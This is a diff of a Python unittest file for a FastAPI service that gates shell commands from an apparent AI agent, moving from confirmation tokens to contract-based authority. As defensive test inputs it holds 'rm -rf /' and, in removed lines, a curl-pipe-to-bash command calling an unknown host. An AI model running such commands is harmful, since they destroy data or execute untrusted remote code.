@@ -1,78 +1,68 @@
 from __future__ import annotations
 
+import os
 import sys
+import tempfile
 import unittest
 from pathlib import Path
+from unittest.mock import patch
 
 from fastapi.testclient import TestClient
 
-
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
 
-from sentinel.api.main import create_app  # noqa: E402
-from sentinel.decision.confirmation import InMemoryConfirmationStore  # noqa: E402
+from sentinel import __version__  # noqa: E402
+from sentinel.api.main import _module_ml_enabled, create_app  # noqa: E402
+from sentinel.audit import SQLiteAuditStore  # noqa: E402
+from sentinel.contracts import SQLiteContractStore  # noqa: E402
 from sentinel.execution import ExecutionResult  # noqa: E402
 from sentinel.ml.inference import RiskPrediction  # noqa: E402
-
-
-class FakeRiskModel:
-    def __init__(self, prediction: RiskPrediction) -> None:
-        self.prediction = prediction
-
-    def predict_row(self, row: dict[str, object]) -> RiskPrediction:
-        self.row = row
-        return self.prediction
+from sentinel.session import (  # noqa: E402
+    ExecutionAttemptBinding,
+    SQLiteSessionStore,
+)
 
 
 class FakeExecutor:
-    def __init__(self, result: ExecutionResult | None = None) -> None:
-        self.result = result or ExecutionResult(
-            stdout="executor output\n",
-            stderr="",
-            exit_code=0,
-            timed_out=False,
-            duration_ms=12,
-        )
+    def __init__(self) -> None:
         self.calls: list[dict[str, str]] = []
+
+    def validate_configuration(self) -> None:
+        pass
+
+    def validate_operation(self, operation: str) -> None:
+        del operation
+
+    def validate_targets(self, targets: list[str]) -> None:
+        del targets
 
     def run(self, *, command: str, shell_type: str) -> ExecutionResult:
         self.calls.append({"command": command, "shell_type": shell_type})
-        return self.result
+        return ExecutionResult(
+            stdout="ok\n",
+            stderr="",
+            exit_code=0,
+            timed_out=False,
+            duration_ms=1,
+        )
 
 
-class TokenFactory:
-    def __init__(self) -> None:
-        self.count = 0
-
-    def __call__(self) -> str:
-        self.count += 1
-        return f"token-{self.count}"
-
-
-class ConfirmationIdFactory:
-    def __init__(self) -> None:
-        self.count = 0
-
-    def __call__(self) -> str:
-        self.count += 1
-        return f"confirmation-{self.count}"
+class AllowModel:
+    def predict_row(self, row: dict[str, object]) -> RiskPrediction:
+        return RiskPrediction(
+            risk_probability=0.01,
+            model_tier="allow",
+            threshold={"warn": 0.2, "confirm_required": 0.4},
+            input_names=[],
+            provider="test",
+            metadata={},
+        )
 
 
-def prediction(probability: float, tier: str) -> RiskPrediction:
-    return RiskPrediction(
-        risk_probability=probability,
-        model_tier=tier,  # type: ignore[arg-type]
-        threshold={"warn": 0.2, "confirm_required": 0.4},
-        input_names=["attention_mask", "input_ids"],
-        provider="CPUExecutionProvider",
-        metadata={"serving_warning": "rules first"},
-    )
-
-
-def evaluate_payload(**overrides: object) -> dict[str, object]:
+def legacy_payload(**overrides: object) -> dict[str, object]:
     payload: dict[str, object] = {
-        "context": "Show git status for this repository.",
-        "command": "git status --short",
+        "context": "Show the sandbox working directory.",
+        "command": "pwd",
         "environment": "sandbox",
         "shell_type": "bash",
         "session_id": "session-1",
@@ -83,596 +73,233 @@ def evaluate_payload(**overrides: object) -> dict[str, object]:
     return payload
 
 
-def deterministic_confirmation_store() -> InMemoryConfirmationStore:
-    return InMemoryConfirmationStore(
-        confirmation_id_factory=ConfirmationIdFactory(),
-        token_factory=TokenFactory(),
-    )
-
-
 class ApiServiceTests(unittest.TestCase):
-    def test_health_reports_degraded_without_model(self) -> None:
-        client = TestClient(create_app(load_model=False))
+    def test_create_app_does_not_load_local_model_without_explicit_opt_in(
+        self,
+    ) -> None:
+        with patch("sentinel.api.main.OnnxRiskModel") as model_factory:
+            app = create_app(load_policy=False)
 
-        response = client.get("/health")
+        body = TestClient(app).get("/health").json()
+        model_factory.assert_not_called()
+        self.assertFalse(body["model_loaded"])
+        self.assertEqual(body["model_detail"], "Model loading is disabled.")
 
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
+    def test_create_app_loads_model_when_explicitly_enabled(self) -> None:
+        loaded_model = AllowModel()
+        with patch(
+            "sentinel.api.main.OnnxRiskModel",
+            return_value=loaded_model,
+        ) as model_factory:
+            app = create_app(load_model=True, load_policy=False)
+
+        model_factory.assert_called_once_with()
+        self.assertIs(app.state.risk_model, loaded_model)
+
+    def test_module_ml_environment_requires_exact_boolean(self) -> None:
+        with patch.dict(os.environ, {}, clear=True):
+            self.assertFalse(_module_ml_enabled())
+        with patch.dict(
+            os.environ,
+            {"SENTINEL_ENABLE_ML": "true"},
+            clear=True,
+        ):
+            self.assertTrue(_module_ml_enabled())
+        with patch.dict(
+            os.environ,
+            {"SENTINEL_ENABLE_ML": "1"},
+            clear=True,
+        ):
+            with self.assertRaisesRegex(ValueError, "exactly"):
+                _module_ml_enabled()
+
+    def test_default_rules_only_app_still_runs_deterministic_policy(self) -> None:
+        response = TestClient(create_app()).post(
+            "/evaluate",
+            json=legacy_payload(),
+        )
+
+        self.assertEqual(response.json()["verdict"], "confirm_required")
+        self.assertIn("rule:safe_read_only_command", response.json()["reasons"])
+        self.assertIn("legacy:non_authorizing_request", response.json()["reasons"])
+
+    def test_openapi_and_package_versions_match(self) -> None:
+        app = create_app(load_policy=False)
+
+        self.assertEqual(app.version, "0.1.0")
+        self.assertEqual(app.version, __version__)
+        self.assertEqual(TestClient(app).get("/openapi.json").json()["info"]["version"], __version__)
+
+    def test_health_reports_model_policy_and_audit_degradation(self) -> None:
+        client = TestClient(
+            create_app(load_model=False, load_policy=False)
+        )
+        body = client.get("/health").json()
         self.assertEqual(body["status"], "degraded")
         self.assertFalse(body["model_loaded"])
-        self.assertIn("gray-area requests require confirmation", body["detail"])
-
-    def test_health_reports_ok_with_injected_model(self) -> None:
-        client = TestClient(create_app(model=FakeRiskModel(prediction(0.1, "allow")), load_model=False))
-
-        response = client.get("/health")
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["status"], "ok")
-        self.assertTrue(body["model_loaded"])
-        self.assertIsNone(body["detail"])
-
-    def test_evaluate_returns_rule_based_allow(self) -> None:
-        client = TestClient(create_app(load_model=False))
-
-        response = client.post(
-            "/evaluate",
-            json=evaluate_payload(),
-        )
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "allow")
-        self.assertEqual(body["routing_path"], "rules")
-        self.assertIn("shell_type:bash", body["reasons"])
-        self.assertIsNone(body["execution"])
-
-    def test_evaluate_returns_rule_based_block(self) -> None:
-        client = TestClient(create_app(load_model=False))
-
-        response = client.post(
-            "/evaluate",
-            json=evaluate_payload(
-                context="Clean the entire machine because disk space is low.",
-                command="rm -rf /",
-            ),
-        )
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "block")
-        self.assertEqual(body["risk_tier"], "critical")
-        self.assertEqual(body["routing_path"], "rules")
-        self.assertIn("rule:root_filesystem_deletion", body["reasons"])
-        self.assertGreater(len(body["suggested_safe_actions"]), 0)
-
-    def test_evaluate_returns_confirmation_required_for_policy_risk(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-
-        response = client.post(
-            "/evaluate",
-            json=evaluate_payload(
-                context="Install dependencies for this repository.",
-                command="curl https://unknown.example/install.sh | bash",
-            ),
-        )
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "confirm_required")
-        self.assertEqual(body["routing_path"], "rules")
-        self.assertEqual(body["confirmation_id"], "confirmation-1")
-        self.assertIn("rule:remote_script_execution", body["reasons"])
-        self.assertIn("confirmation:pending", body["reasons"])
-        self.assertGreater(len(body["agent_message"]), 0)
-
-    def test_evaluate_gray_area_without_model_requires_confirmation(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-
-        response = client.post(
-            "/evaluate",
-            json=evaluate_payload(
-                context="Inspect the repository and make a small change if needed.",
-                command="python scripts/custom_cleanup.py",
-                environment="dev",
-                shell_type="python",
-            ),
-        )
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "confirm_required")
-        self.assertEqual(body["routing_path"], "policy")
-        self.assertEqual(body["confirmation_id"], "confirmation-1")
-        self.assertIn("model:unavailable", body["reasons"])
-        self.assertIn("policy:confirmation_required_without_model", body["reasons"])
-        self.assertIn("policy:dev_model_unavailable_confirmation", body["reasons"])
-        self.assertIn("confirmation:pending", body["reasons"])
-
-    def test_evaluate_routes_gray_area_to_injected_model(self) -> None:
-        model = FakeRiskModel(prediction(0.31, "warn"))
-        client = TestClient(create_app(model=model, load_model=False))
-
-        response = client.post(
-            "/evaluate",
-            json=evaluate_payload(
-                context="Inspect the repository and make a small change if needed.",
-                command="python scripts/custom_cleanup.py",
-                environment="dev",
-                shell_type="python",
-            ),
-        )
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "warn")
-        self.assertEqual(body["risk_score"], 0.31)
-        self.assertEqual(body["routing_path"], "model")
-        self.assertIn("model:warn", body["reasons"])
-        self.assertEqual(model.row["command"], "python scripts/custom_cleanup.py")
-        self.assertNotIn("shell_type", model.row)
-
-    def test_execute_runs_rule_based_allow_in_executor(self) -> None:
-        executor = FakeExecutor()
-        client = TestClient(create_app(load_model=False, executor=executor))
-
-        response = client.post("/execute", json=evaluate_payload())
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "allow")
-        self.assertEqual(body["routing_path"], "rules")
-        self.assertEqual(body["execution"]["stdout"], "executor output\n")
-        self.assertEqual(body["execution"]["exit_code"], 0)
-        self.assertIn("execution:sandbox_attempted", body["reasons"])
-        self.assertEqual(executor.calls, [{"command": "git status --short", "shell_type": "bash"}])
-
-    def test_execute_does_not_run_blocked_command(self) -> None:
-        executor = FakeExecutor()
-        client = TestClient(create_app(load_model=False, executor=executor))
-
-        response = client.post(
-            "/execute",
-            json=evaluate_payload(
-                context="Clean the entire machine because disk space is low.",
-                command="rm -rf /",
-            ),
-        )
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "block")
-        self.assertIsNone(body["execution"])
-        self.assertEqual(executor.calls, [])
-
-    def test_execute_does_not_run_confirmation_required_command(self) -> None:
-        executor = FakeExecutor()
-        client = TestClient(
-            create_app(
-                load_model=False,
-                confirmation_store=deterministic_confirmation_store(),
-                executor=executor,
-            )
-        )
-
-        response = client.post(
-            "/execute",
-            json=evaluate_payload(
-                context="Run an unfamiliar project helper.",
-                command="python scripts/custom_cleanup.py",
-                environment="dev",
-                shell_type="python",
-            ),
-        )
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "confirm_required")
-        self.assertEqual(body["confirmation_id"], "confirmation-1")
-        self.assertIsNone(body["execution"])
-        self.assertEqual(executor.calls, [])
-
-    def test_execute_does_not_run_warn_verdict(self) -> None:
-        executor = FakeExecutor()
-        model = FakeRiskModel(prediction(0.31, "warn"))
-        client = TestClient(create_app(model=model, load_model=False, executor=executor))
-
-        response = client.post(
-            "/execute",
-            json=evaluate_payload(
-                context="Inspect the repository and make a small change if needed.",
-                command="python scripts/custom_cleanup.py",
-                environment="dev",
-                shell_type="python",
-            ),
-        )
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "warn")
-        self.assertIsNone(body["execution"])
-        self.assertEqual(executor.calls, [])
-
-    def test_execute_runs_after_valid_confirmation_token(self) -> None:
-        executor = FakeExecutor()
-        client = TestClient(
-            create_app(
-                load_model=False,
-                confirmation_store=deterministic_confirmation_store(),
-                executor=executor,
-            )
-        )
-        payload = evaluate_payload(
-            context="Run an unfamiliar project helper.",
-            command="python scripts/custom_cleanup.py",
-            environment="dev",
-            shell_type="python",
-        )
-        first_response = client.post("/execute", json=payload)
-        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
-        payload["confirmation_token"] = token_response.json()["confirmation_token"]
-
-        approved_response = client.post("/execute", json=payload)
-
-        self.assertEqual(approved_response.status_code, 200)
-        body = approved_response.json()
-        self.assertEqual(body["verdict"], "allow")
-        self.assertEqual(body["routing_path"], "confirmation")
-        self.assertEqual(body["execution"]["stdout"], "executor output\n")
-        self.assertEqual(executor.calls, [{"command": "python scripts/custom_cleanup.py", "shell_type": "python"}])
-
-    def test_execute_with_reused_confirmation_token_does_not_run(self) -> None:
-        executor = FakeExecutor()
-        client = TestClient(
-            create_app(
-                load_model=False,
-                confirmation_store=deterministic_confirmation_store(),
-                executor=executor,
-            )
-        )
-        payload = evaluate_payload(
-            context="Run an unfamiliar project helper.",
-            command="python scripts/custom_cleanup.py",
-            environment="dev",
-            shell_type="python",
-        )
-        first_response = client.post("/execute", json=payload)
-        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
-        payload["confirmation_token"] = token_response.json()["confirmation_token"]
-        client.post("/execute", json=payload)
-
-        reused_response = client.post("/execute", json=payload)
-
-        body = reused_response.json()
-        self.assertEqual(body["verdict"], "confirm_required")
-        self.assertIn("confirmation:token_invalid_or_mismatch", body["reasons"])
-        self.assertIsNone(body["execution"])
-        self.assertEqual(len(executor.calls), 1)
-
-    def test_execute_surfaces_sandbox_error_without_host_fallback(self) -> None:
-        failed = ExecutionResult(
-            stdout="",
-            stderr="",
-            exit_code=None,
-            timed_out=False,
-            duration_ms=3,
-            error="Docker executable not found: docker",
-        )
-        executor = FakeExecutor(result=failed)
-        client = TestClient(create_app(load_model=False, executor=executor))
-
-        response = client.post("/execute", json=evaluate_payload())
-
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "allow")
-        self.assertEqual(body["execution"]["error"], "Docker executable not found: docker")
-        self.assertIsNone(body["execution"]["exit_code"])
-        self.assertEqual(len(executor.calls), 1)
-
-    def test_execute_surfaces_timeout_result(self) -> None:
-        timed_out = ExecutionResult(
-            stdout="partial",
-            stderr="",
-            exit_code=None,
-            timed_out=True,
-            duration_ms=10_000,
-            error="Command timed out after 10 seconds.",
-        )
-        executor = FakeExecutor(result=timed_out)
-        client = TestClient(create_app(load_model=False, executor=executor))
-
-        response = client.post("/execute", json=evaluate_payload())
-
-        body = response.json()
-        self.assertTrue(body["execution"]["timed_out"])
-        self.assertEqual(body["execution"]["stdout"], "partial")
-        self.assertIn("timed out", body["execution"]["error"])
-
-    def test_default_executor_reads_environment_overrides(self) -> None:
-        import os
-
-        from sentinel.api.main import _default_executor
-
-        overrides = {
-            "SENTINEL_EXECUTOR_IMAGE": "sentinel-executor:test",
-            "SENTINEL_EXECUTOR_WORKSPACE": "/tmp",
-            "SENTINEL_EXECUTOR_TIMEOUT_SECONDS": "42",
-            "SENTINEL_EXECUTOR_READONLY_WORKSPACE": "true",
-        }
-        saved = {key: os.environ.get(key) for key in overrides}
-        os.environ.update(overrides)
-        try:
-            executor = _default_executor()
-        finally:
-            for key, value in saved.items():
-                if value is None:
-                    os.environ.pop(key, None)
-                else:
-                    os.environ[key] = value
-
-        self.assertEqual(executor.image, "sentinel-executor:test")
-        self.assertEqual(str(executor.workspace), "/tmp")
-        self.assertEqual(executor.timeout_seconds, 42)
-        self.assertTrue(executor.read_only_workspace)
-
-    def test_default_executor_ignores_malformed_timeout_env(self) -> None:
-        import os
-
-        from sentinel.api.main import _default_executor
-
-        cases = ["abc", "10.5", "-5", "0", ""]
-        saved = os.environ.get("SENTINEL_EXECUTOR_TIMEOUT_SECONDS")
-        try:
-            for raw in cases:
-                os.environ["SENTINEL_EXECUTOR_TIMEOUT_SECONDS"] = raw
-                executor = _default_executor()
-                self.assertEqual(executor.timeout_seconds, 10, f"default expected for {raw!r}")
-        finally:
-            if saved is None:
-                os.environ.pop("SENTINEL_EXECUTOR_TIMEOUT_SECONDS", None)
-            else:
-                os.environ["SENTINEL_EXECUTOR_TIMEOUT_SECONDS"] = saved
-
-    def test_execute_returns_429_when_concurrency_limit_reached(self) -> None:
-        executor = FakeExecutor()
-        app = create_app(load_model=False, executor=executor)
-        # Exhaust the limiter to simulate max concurrent sandbox executions.
-        while app.state.execution_limiter.acquire(blocking=False):
-            pass
-        client = TestClient(app)
-
-        response = client.post("/execute", json=evaluate_payload())
-
-        self.assertEqual(response.status_code, 429)
-        self.assertEqual(executor.calls, [])
-
-    def test_execute_releases_concurrency_slot_after_run(self) -> None:
-        executor = FakeExecutor()
-        client = TestClient(create_app(load_model=False, executor=executor))
-
-        first = client.post("/execute", json=evaluate_payload())
-        second = client.post("/execute", json=evaluate_payload())
-
-        self.assertEqual(first.status_code, 200)
-        self.assertEqual(second.status_code, 200)
-        self.assertEqual(len(executor.calls), 2)
-
-    def test_evaluate_rejects_oversized_command(self) -> None:
-        client = TestClient(create_app(load_model=False))
-
-        response = client.post("/evaluate", json=evaluate_payload(command="x" * 40_000))
-
-        self.assertEqual(response.status_code, 422)
-
-    def test_evaluate_rejects_missing_required_command(self) -> None:
-        client = TestClient(create_app(load_model=False))
-        payload = evaluate_payload()
-        del payload["command"]
-
-        response = client.post("/evaluate", json=payload)
-
-        self.assertEqual(response.status_code, 422)
-
-    def test_evaluate_rejects_invalid_environment(self) -> None:
-        client = TestClient(create_app(load_model=False))
-
-        response = client.post("/evaluate", json=evaluate_payload(environment="prod"))
-
-        self.assertEqual(response.status_code, 422)
-
-    def test_evaluate_rejects_invalid_shell_type(self) -> None:
-        client = TestClient(create_app(load_model=False))
-
-        response = client.post("/evaluate", json=evaluate_payload(shell_type="ruby"))
-
-        self.assertEqual(response.status_code, 422)
-
-    def test_confirm_endpoint_returns_token_for_pending_confirmation(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-        evaluate_response = client.post(
-            "/evaluate",
-            json=evaluate_payload(
-                context="Run an unfamiliar project helper.",
-                command="python scripts/custom_cleanup.py",
-                environment="dev",
-                shell_type="python",
-            ),
-        )
-        confirmation_id = evaluate_response.json()["confirmation_id"]
-
-        confirm_response = client.post("/confirm", json={"confirmation_id": confirmation_id})
-
-        self.assertEqual(confirm_response.status_code, 200)
-        body = confirm_response.json()
-        self.assertEqual(body["confirmation_id"], "confirmation-1")
-        self.assertEqual(body["confirmation_token"], "token-1")
-
-    def test_evaluate_accepts_valid_confirmation_token_for_exact_request(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-        payload = evaluate_payload(
-            context="Run an unfamiliar project helper.",
-            command="python scripts/custom_cleanup.py",
-            environment="dev",
-            shell_type="python",
-        )
-        first_response = client.post("/evaluate", json=payload)
-        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
-        payload["confirmation_token"] = token_response.json()["confirmation_token"]
-
-        approved_response = client.post("/evaluate", json=payload)
-
-        self.assertEqual(approved_response.status_code, 200)
-        body = approved_response.json()
-        self.assertEqual(body["verdict"], "allow")
-        self.assertEqual(body["routing_path"], "confirmation")
-        self.assertIsNone(body["confirmation_id"])
-        self.assertIn("confirmation:token_valid", body["reasons"])
-
-    def test_evaluate_rejects_confirmation_token_for_changed_command(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-        payload = evaluate_payload(
-            context="Run an unfamiliar project helper.",
-            command="python scripts/custom_cleanup.py",
-            environment="dev",
-            shell_type="python",
-        )
-        first_response = client.post("/evaluate", json=payload)
-        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
-
-        changed_payload = dict(payload)
-        changed_payload["command"] = "python scripts/other_cleanup.py"
-        changed_payload["confirmation_token"] = token_response.json()["confirmation_token"]
-        mismatch_response = client.post("/evaluate", json=changed_payload)
-
-        self.assertEqual(mismatch_response.status_code, 200)
-        body = mismatch_response.json()
-        self.assertEqual(body["verdict"], "confirm_required")
-        self.assertEqual(body["routing_path"], "policy")
-        self.assertEqual(body["confirmation_id"], "confirmation-2")
-        self.assertIn("confirmation:token_invalid_or_mismatch", body["reasons"])
-
-    def test_confirmation_token_rejects_changes_to_any_fingerprint_field(self) -> None:
-        cases: list[tuple[str, dict[str, object]]] = [
-            ("context", {"context": "Run a different unfamiliar helper."}),
-            ("command", {"command": "python scripts/other_cleanup.py"}),
-            ("environment", {"environment": "staging"}),
-            ("shell_type", {"shell_type": "zsh"}),
-            ("recent_actions", {"recent_actions": [{"type": "command", "summary": "Read a config file.", "sensitive_resources": []}]}),
-            ("session_id", {"session_id": "session-2"}),
-            ("agent_id", {"agent_id": "agent-2"}),
-            ("user_id", {"user_id": "user-2"}),
-        ]
-
-        for field_name, changed_fields in cases:
-            with self.subTest(field=field_name):
-                client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-                payload = evaluate_payload(
-                    context="Run an unfamiliar project helper.",
-                    command="python scripts/custom_cleanup.py",
-                    environment="dev",
-                    shell_type="python",
+        self.assertFalse(body["policy_loaded"])
+        self.assertEqual(body["audit_status"], "ok")
+
+    def test_owned_sqlite_stores_close_after_each_app_lifecycle(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            database = str(Path(directory) / "sentinel.sqlite3")
+            previous = os.environ.get("SENTINEL_STATE_DB")
+            os.environ["SENTINEL_STATE_DB"] = database
+            try:
+                first_app = create_app(load_policy=False)
+                binding = ExecutionAttemptBinding(
+                    attempt_id="attempt-recovery",
+                    session_id="session-1",
+                    task_id="task-1",
+                    contract_id="contract-1",
+                    contract_version=1,
+                    authority_epoch=1,
+                    action_fingerprint="a" * 64,
+                    environment="sandbox",
                 )
-                first_response = client.post("/evaluate", json=payload)
-                token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
+                with TestClient(first_app):
+                    first_app.state.session_store.reserve_attempt(binding)
+                    first_app.state.session_store.transition_attempt(
+                        binding.attempt_id,
+                        expected_state="reserved",
+                        new_state="running",
+                    )
 
-                changed_payload = dict(payload)
-                changed_payload.update(changed_fields)
-                changed_payload["confirmation_token"] = token_response.json()["confirmation_token"]
-                mismatch_response = client.post("/evaluate", json=changed_payload)
+                second_app = create_app(load_policy=False)
+                with TestClient(second_app):
+                    recovered = second_app.state.session_store.get_attempt(
+                        binding.attempt_id
+                    )
+                    self.assertIsNotNone(recovered)
+                    assert recovered is not None
+                    self.assertEqual(recovered.state, "unknown")
 
-                self.assertEqual(mismatch_response.status_code, 200)
-                body = mismatch_response.json()
-                self.assertEqual(body["verdict"], "confirm_required")
-                self.assertIsNotNone(body["confirmation_id"])
-                self.assertIn("confirmation:token_invalid_or_mismatch", body["reasons"])
+                third_app = create_app(load_policy=False)
+                with TestClient(third_app):
+                    self.assertEqual(
+                        third_app.state.session_store.get_attempt(
+                            binding.attempt_id
+                        ).state,
+                        "unknown",
+                    )
+            finally:
+                if previous is None:
+                    os.environ.pop("SENTINEL_STATE_DB", None)
+                else:
+                    os.environ["SENTINEL_STATE_DB"] = previous
 
-    def test_confirmation_token_is_one_use(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-        payload = evaluate_payload(
-            context="Run an unfamiliar project helper.",
-            command="python scripts/custom_cleanup.py",
-            environment="dev",
-            shell_type="python",
+    def test_injected_sqlite_stores_are_not_closed_by_app_lifecycle(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            database = Path(directory) / "injected.sqlite3"
+            contracts = SQLiteContractStore(database)
+            sessions = SQLiteSessionStore(database)
+            audit = SQLiteAuditStore(database)
+            try:
+                app = create_app(
+                    load_policy=False,
+                    contract_store=contracts,
+                    session_store=sessions,
+                    audit_store=audit,
+                )
+                with TestClient(app):
+                    pass
+
+                self.assertIsNone(contracts.get_active("session-1"))
+                self.assertEqual(sessions.get_recent_actions("session-1"), [])
+                self.assertEqual(audit.health.status, "ok")
+            finally:
+                contracts.close()
+                sessions.close()
+                audit.close()
+
+    def test_confirm_route_does_not_exist(self) -> None:
+        client = TestClient(create_app(load_model=False))
+        self.assertEqual(
+            client.post("/confirm", json={"confirmation_id": "anything"}).status_code,
+            404,
         )
-        first_response = client.post("/evaluate", json=payload)
-        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
-        payload["confirmation_token"] = token_response.json()["confirmation_token"]
 
-        first_approved_response = client.post("/evaluate", json=payload)
-        second_approved_response = client.post("/evaluate", json=payload)
-
-        self.assertEqual(first_approved_response.json()["verdict"], "allow")
-        self.assertEqual(second_approved_response.json()["verdict"], "confirm_required")
-        self.assertIn("confirmation:token_invalid_or_mismatch", second_approved_response.json()["reasons"])
-
-    def test_user_confirmed_without_token_still_requires_confirmation(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-
-        response = client.post(
-            "/evaluate",
-            json=evaluate_payload(
-                context="Run an unfamiliar project helper.",
-                command="python scripts/custom_cleanup.py",
-                environment="dev",
+    def test_legacy_execute_never_runs_without_contract_authority(self) -> None:
+        executor = FakeExecutor()
+        client = TestClient(
+            create_app(load_model=False, load_policy=False, executor=executor)
+        )
+        allowed = client.post("/execute", json=legacy_payload())
+        ambiguous = client.post(
+            "/execute",
+            json=legacy_payload(
+                context="Run a project helper.",
+                command="python scripts/helper.py",
                 shell_type="python",
+                confirmation_token="ignored",
                 user_confirmed=True,
             ),
         )
 
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "confirm_required")
-        self.assertEqual(body["confirmation_id"], "confirmation-1")
-        self.assertIn("confirmation:user_confirmed_untrusted_without_token", body["reasons"])
+        self.assertEqual(allowed.json()["verdict"], "confirm_required")
+        self.assertIn("legacy:non_authorizing_request", allowed.json()["reasons"])
+        self.assertEqual(ambiguous.json()["verdict"], "confirm_required")
+        self.assertIn("legacy:non_authorizing_request", ambiguous.json()["reasons"])
+        self.assertEqual(executor.calls, [])
 
-    def test_confirm_endpoint_rejects_unknown_confirmation_id(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-
-        response = client.post("/confirm", json={"confirmation_id": "missing"})
-
-        self.assertEqual(response.status_code, 404)
-
-    def test_confirm_endpoint_rejects_already_approved_confirmation_id(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
-        evaluate_response = client.post(
-            "/evaluate",
-            json=evaluate_payload(
-                context="Run an unfamiliar project helper.",
-                command="python scripts/custom_cleanup.py",
-                environment="dev",
+    def test_legacy_model_allow_cannot_authorize_execution(self) -> None:
+        executor = FakeExecutor()
+        client = TestClient(
+            create_app(
+                model=AllowModel(),
+                load_model=False,
+                executor=executor,
+            )
+        )
+        response = client.post(
+            "/execute",
+            json=legacy_payload(
+                context="Run helper.",
+                command="python scripts/helper.py",
                 shell_type="python",
             ),
         )
-        confirmation_id = evaluate_response.json()["confirmation_id"]
+        self.assertEqual(response.json()["verdict"], "confirm_required")
+        self.assertEqual(executor.calls, [])
 
-        first_response = client.post("/confirm", json={"confirmation_id": confirmation_id})
-        second_response = client.post("/confirm", json={"confirmation_id": confirmation_id})
+    def test_legacy_critical_rule_still_blocks(self) -> None:
+        executor = FakeExecutor()
+        client = TestClient(create_app(load_model=False, executor=executor))
+        response = client.post(
+            "/execute",
+            json=legacy_payload(command="rm -rf /", context="Clean the machine."),
+        )
+        self.assertEqual(response.json()["verdict"], "block")
+        self.assertIn("rule:root_filesystem_deletion", response.json()["reasons"])
+        self.assertEqual(executor.calls, [])
 
-        self.assertEqual(first_response.status_code, 200)
-        self.assertEqual(second_response.status_code, 404)
+    def test_request_body_limit_returns_413(self) -> None:
+        client = TestClient(create_app(load_model=False))
+        response = client.post(
+            "/evaluate",
+            content=b'{"padding":"' + (b"x" * 70_000) + b'"}',
+            headers={"content-type": "application/json"},
+        )
+        self.assertEqual(response.status_code, 413)
 
-    def test_block_decision_does_not_create_confirmation_id(self) -> None:
-        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
+    def test_chunked_request_body_limit_returns_413(self) -> None:
+        client = TestClient(create_app(load_model=False))
+
+        def chunks():
+            for _ in range(80):
+                yield b"x" * 1_024
 
         response = client.post(
             "/evaluate",
-            json=evaluate_payload(
-                context="Clean the entire machine because disk space is low.",
-                command="rm -rf /",
-                confirmation_token="token-1",
-                user_confirmed=True,
-            ),
+            content=chunks(),
+            headers={
+                "content-type": "application/json",
+                "transfer-encoding": "chunked",
+            },
         )
 
-        self.assertEqual(response.status_code, 200)
-        body = response.json()
-        self.assertEqual(body["verdict"], "block")
-        self.assertEqual(body["routing_path"], "rules")
-        self.assertIsNone(body["confirmation_id"])
+        self.assertEqual(response.status_code, 413)
 
 
 if __name__ == "__main__":
     unittest.main()
-
